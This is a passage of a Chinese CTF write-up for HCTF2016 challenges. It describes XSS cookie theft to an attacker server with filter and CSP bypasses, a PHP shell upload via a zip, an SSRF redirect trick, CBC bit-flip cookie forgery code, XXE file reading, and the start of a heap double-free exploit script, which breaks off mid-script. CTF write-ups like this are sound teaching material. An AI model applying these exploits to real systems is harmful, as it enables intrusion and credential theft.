style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后观察到返回的请求头</span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">Content-Security-Policy:default-src&nbsp;'self';&nbsp;script-src&nbsp;'self'&nbsp;'unsafe-inline';&nbsp;font-src&nbsp;'self'&nbsp;fonts.gstatic.com;&nbsp;style-src&nbsp;'self'&nbsp;'unsafe-inline';&nbsp;img-src&nbsp;'self'</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CSP策略中script可以执行inline。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是直接在message中写js代码通过location.href跳转或者xhr的方式把cookie和当前网址发送到自己的服务器上。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后观察到script 和 on 被置换为空，双写绕过即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后伪造cookie登陆后拿到flag</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level4-大图书馆的牧羊人</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">扫描到.git/config 下载源码后发现登录后会将用户名加密存储在cookie中，而如果cookie解密后是admin，就能访问到后台。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">用comm.php里的密钥加密admin登陆上后台，有一个上传功能</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">$files&nbsp;=&nbsp;isset($_FILES['file'])&nbsp;?&nbsp;$_FILES['file']&nbsp;:&nbsp;exit();</code></div><div class="line number2 index1 alt1"><code class="plain plain">if($files['type']!=="application/epub+zip")&nbsp;{</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">exit("Not&nbsp;Allow&nbsp;type!");</code></div><div class="line number4 index3 alt1"><code class="plain plain">}</code></div><div class="line number5 index4 alt2"><code class="plain plain">//extract</code></div><div class="line number6 index5 alt1"><code class="plain plain">$file&nbsp;=&nbsp;new&nbsp;ZipArchive;</code></div><div class="line number7 index6 alt2"><code class="plain plain">$epub_name&nbsp;=&nbsp;$files['tmp_name'];</code></div><div class="line number8 index7 alt1"><code class="plain plain">$extracted_path&nbsp;=&nbsp;'uploads/'.basename($files['name'],".epub")."/";</code></div><div class="line number9 index8 alt2"><code class="plain plain">if&nbsp;($file-&gt;open($epub_name)&nbsp;===&nbsp;TRUE){</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">$file-&gt;extractTo($extracted_path);</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">$file-&gt;close();</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">阅读上传源码,只需要修改content-type让代码继续执行，去解压zip到uploads目录。于是直接上传一个有php shell的zip就拿到了shell</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level4-secret area</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">和guestbook比较类似，也有防御xss的csp策略而且并不支持script 的 inline执行。注册登录后发现修改个人资料处提供一个上传头像的功能，然而在测试一番后发现上传处并没有什么缺陷，但是在html中发现有个功能提供302跳转<a href="http://sguestbook.hctf.io/static/redirect.php?u=" _src="http://sguestbook.hctf.io/static/redirect.php?u=">http://sguestbook.hctf.io/static/redirect.php?u=</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而http://sguestbook.hctf.io/static/ 目录是在csp策略里script标签白名单里的，于是在头像文件里写上xss payload，上传后得到http://sguestbook.hctf.io/ /upload/e8ea98429c80cfd74e000cce900612a3。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后就只需要构造&lt;script src=http://sguestbook.hctf.io/static/redirect.php?u=/upload/e8ea98429c80cfd74e000cce900612a3 &gt; 这个标签即可绕过csp策略。script on 被过滤，也是双写绕过即可。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level4-web选手的自我修养</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下载docker镜像misc.tar后执行命令</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">docker&nbsp;load&nbsp;&lt;&nbsp;misc.tar</code></div><div class="line number2 index1 alt1"><code class="plain plain">docker&nbsp;run&nbsp;-t&nbsp;-i&nbsp;hctf/misc150&nbsp;/bin/bash</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">加载镜像并执行镜像里的bash</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Home目录中发现php7-opcache-override-master。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是查找到一篇资料<a href="http://www.tuicool.com/articles/ryE3Qfi" _src="http://www.tuicool.com/articles/ryE3Qfi">http://www.tuicool.com/articles/ryE3Qfi</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">利用opcache隐藏后门</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是去/tmp/opcache/5c8fa39e1df122a51d720c5716df71e4/home/wwwro</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ot/default/ 查找发现一堆bin文件。就又去home目录翻到了wwwlogs/access.log</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">发现有多条记录直接访问/wp-includes/class-wp.php，这个文件一般来说会用包含的方式使用，猜测后门就在这里。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编辑器打开/tmp/opcache/5c8fa39e1df122a51d720c5716df71e4/home/wwwroot/default/wp-includes/class-wp.php.bin 有一堆不可见字符，用strings命令提取后最后两行</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01f555054791f26d21.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01f555054791f26d21.png" title="t012e32d578c1d608d4.png" alt="http://p8.qhimg.com/t012e32d578c1d608d4.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Base64解码后得到flag</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level4-AT Field_1</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">ssrf 漏洞，限制了内网ip。通过302跳转可以绕过，</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在网址处输入<a href="http://sguestbook.hctf.io/static/redirect.php?u=http://127.0.0.1" _src="http://sguestbook.hctf.io/static/redirect.php?u=http://127.0.0.1">http://sguestbook.hctf.io/static/redirect.php?u=http://127.0.0.1</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">源码中有一串base64 解码即可得到flag</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">level5-魔法禁书目录</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">和前面那道题一样，只是不再有明文的密钥，而是通过cbc翻转攻击构造管理员的cookie</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">类似于<a href="http://www.liuhaihua.cn/archives/375276.html" _src="http://www.liuhaihua.cn/archives/375276.html">http://www.liuhaihua.cn/archives/375276.html</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然而注册的时候用户名控制在6-20之间。构造admin的密文需要得到同样为5位长度或者5+16长度的明文加密后的密文。恰好在这个范围之外。查看代码发现</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">function&nbsp;decrypt(&nbsp;$string&nbsp;)&nbsp;{</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;&nbsp;</code><code class="plain plain">$密钥&nbsp;=&nbsp;"233333";</code></div><div class="line number3 index2 alt2"><code class="plain plain">$algorithm&nbsp;=&nbsp;&nbsp;'rijndael-128';</code></div><div class="line number4 index3 alt1"><code class="plain plain">$key&nbsp;=&nbsp;md5($密钥,&nbsp;true&nbsp;);</code></div><div class="line number5 index4 alt2"><code class="plain plain">$iv_length&nbsp;=&nbsp;mcrypt_get_iv_size(&nbsp;$algorithm,&nbsp;MCRYPT_MODE_CBC&nbsp;);</code></div><div class="line number6 index5 alt1"><code class="plain plain">$string&nbsp;=&nbsp;urlsafe_b64decode(&nbsp;$string&nbsp;);</code></div><div class="line number7 index6 alt2"><code class="plain plain">$iv&nbsp;=&nbsp;substr(&nbsp;$string,&nbsp;0,&nbsp;$iv_length&nbsp;);</code></div><div class="line number8 index7 alt1"><code class="plain plain">$encrypted&nbsp;=&nbsp;substr(&nbsp;$string,&nbsp;$iv_length&nbsp;);</code></div><div class="line number9 index8 alt2"><code class="plain plain">$result&nbsp;=&nbsp;mcrypt_decrypt(&nbsp;$algorithm,&nbsp;$key,&nbsp;$encrypted,&nbsp;MCRYPT_MODE_CBC,&nbsp;$iv&nbsp;);</code></div><div class="line number10 index9 alt1"><code class="plain plain">$result&nbsp;=&nbsp;rtrim($result,&nbsp;"\0");</code></div><div class="line number11 index10 alt2"><code class="plain plain">return&nbsp;$result;</code></div><div class="line number12 index11 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在解密的最后清除掉了\0</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以构造admin\0的密文即可</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注册一个adminx的用户，得到密文 oPR4gZAqfHYnOhWw1GcX-zIEvN_1OCaamhmDLxRigpA</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">&lt;?php</code></div><div class="line number2 index1 alt1"><code class="plain plain">function&nbsp;urlsafe_b64encode($string)&nbsp;{</code></div><div class="line number3 index2 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">$data&nbsp;=&nbsp;base64_encode($string);</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">$data&nbsp;=&nbsp;str_replace(array('+','/','='),array('-','_',''),$data);</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;$data;</code></div><div class="line number6 index5 alt1"><code class="plain plain">}</code></div><div class="line number7 index6 alt2"><code class="plain plain">function&nbsp;urlsafe_b64decode($string)&nbsp;{</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">$data&nbsp;=&nbsp;str_replace(array('-','_'),array('+','/'),$string);</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">$mod4&nbsp;=&nbsp;strlen($data)&nbsp;%&nbsp;4;</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;($mod4)&nbsp;{</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">$data&nbsp;.=&nbsp;substr('====',&nbsp;$mod4);</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">}</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;base64_decode($data);</code></div><div class="line number14 index13 alt1"><code class="plain plain">}</code></div><div class="line number15 index14 alt2"><code class="plain plain">function&nbsp;decrypt2(&nbsp;$string&nbsp;)&nbsp;{</code></div><div class="line number16 index15 alt1"><code class="plain plain">$string&nbsp;=&nbsp;urlsafe_b64decode(&nbsp;$string&nbsp;);</code></div><div class="line number17 index16 alt2"><code class="plain plain">$string[5]&nbsp;=&nbsp;chr(ord($string[5])^0^ord('x'));</code></div><div class="line number18 index17 alt1"><code class="plain plain">$string&nbsp;=&nbsp;urlsafe_b64encode($string);</code></div><div class="line number19 index18 alt2"><code class="plain plain">return&nbsp;$string;</code></div><div class="line number20 index19 alt1"><code class="plain plain">}</code></div><div class="line number21 index20 alt2"><code class="plain plain">echo&nbsp;decrypt2("oPR4gZAqfHYnOhWw1GcX-zIEvN_1OCaamhmDLxRigpA");</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">得到密文后伪造cookie登陆。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">审计到upload.php中有xml的解析。于是利用xxe漏洞盲打读取根目录flag.php文件内容即可</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">就是干（fheap）</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">漏洞部分：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">删除时，由于检查的条件str_info指针在delete后并没有置空，存在double free，如下：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01111d78d6f6814bc9.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01111d78d6f6814bc9.png" title="t019f4a801c94c4ea91.png" alt="http://p8.qhimg.com/t019f4a801c94c4ea91.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">结构体如下，存在函数指针：</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0104552c9aac07dcab.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0104552c9aac07dcab.png" title="t01a06f465cf147a648.png" alt="http://p2.qhimg.com/t01a06f465cf147a648.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">创建时，管理结构大小为0x20字节，而数据部分大小可控。如下：&nbsp;</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012d9d6843a257823a.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012d9d6843a257823a.png" title="t01c9a26b28203533a8.png" alt="http://p8.qhimg.com/t01c9a26b28203533a8.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">利用点：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以可以根据fastbin，构造数据部分和管理结构大小相等，在分配时，错乱顺序，可以让数据部分和管理结构重合，从而改写函数指针，程序开启了pie，可以只改写释放函数的后两字节（其前面部分地址是一样的），将其改写成printf_plt，实现任意地址泄露，因为libc没有提供，所以可以通过printf来实现dynelf的leak函数，由于前面说的数据段和管理结构可以重叠，改写buff指针以及其函数指针，最终利用代码如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">脚本如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div><div class="line number136 index135 alt1">136</div><div class="line number137 index136 alt2">137</div><div class="line number138 index137 alt1">138</div><div class="line number139 index138 alt2">139</div><div class="line number140 index139 alt1">140</div><div class="line number141 index140 alt2">141</div><div class="line number142 index141 alt1">142</div><div class="line number143 index142 alt2">143</div><div class="line number144 index143 alt1">144</div><div class="line number145 index144 alt2">145</div><div class="line number146 index145 alt1">146</div><div class="line number147 index146 alt2">147</div><div class="line number148 index147 alt1">148</div><div class="line number149 index148 alt2">149</div><div class="line number150 index149 alt1">150</div><div class="line number151 index150 alt2">151</div><div class="line number152 index151 alt1">152</div><div class="line number153 index152 alt2">153</div><div class="line number154 index153 alt1">154</div><div class="line number155 index154 alt2">155</div><div class="line number156 index155 alt1">156</div><div class="line number157 index156 alt2">157</div><div class="line number158 index157 alt1">158</div><div class="line number159 index158 alt2">159</div><div class="line number160 index159 alt1">160</div><div class="line number161 index160 alt2">161</div><div class="line number162 index161 alt1">162</div><div class="line number163 index162 alt2">163</div><div class="line number164 index163 alt1">164</div><div class="line number165 index164 alt2">165</div><div class="line number166 index165 alt1">166</div><div class="line number167 index166 alt2">167</div><div class="line number168 index167 alt1">168</div><div class="line number169 index168 alt2">169</div><div class="line number170 index169 alt1">170</div><div class="line number171 index170 alt2">171</div><div class="line number172 index171 alt1">172</div><div class="line number173 index172 alt2">173</div><div class="line number174 index173 alt1">174</div><div class="line number175 index174 alt2">175</div><div class="line number176 index175 alt1">176</div><div class="line number177 index176 alt2">177</div><div class="line number178 index177 alt1">178</div><div class="line number179 index178 alt2">179</div><div class="line number180 index179 alt1">180</div><div class="line number181 index180 alt2">181</div><div class="line number182 index181 alt1">182</div><div class="line number183 index182 alt2">183</div><div class="line number184 index183 alt1">184</div><div class="line number185 index184 alt2">185</div><div class="line number186 index185 alt1">186</div><div class="line number187 index186 alt2">187</div><div class="line number188 index187 alt1">188</div><div class="line number189 index188 alt2">189</div><div class="line number190 index189 alt1">190</div><div class="line number191 index190 alt2">191</div><div class="line number192 index191 alt1">192</div><div class="line number193 index192 alt2">193</div><div class="line number194 index193 alt1">194</div><div class="line number195 index194 alt2">195</div><div class="line number196 index195 alt1">196</div><div class="line number197 index196 alt2">197</div><div class="line number198 index197 alt1">198</div><div class="line number199 index198 alt2">199</div><div class="line number200 index199 alt1">200</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;zio&nbsp;import&nbsp;*</code></div><div class="line number2 index1 alt1"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number3 index2 alt2"><code class="plain plain">target&nbsp;=&nbsp;"./fheap"</code></div><div class="line number4 index3 alt1"><code class="plain plain">target&nbsp;=&nbsp;("115.28.78.54",&nbsp;80)</code></div><div class="line number5 index4 alt2"><code class="plain spaces">&nbsp;</code>&nbsp;</div><div class="line number6 index5 alt1"><code class="plain plain">def&nbsp;get_io(target):</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">r_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"green")</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">w_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"blue")</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m)</code></div><div class="line number10 index9 alt1"><code class="plain 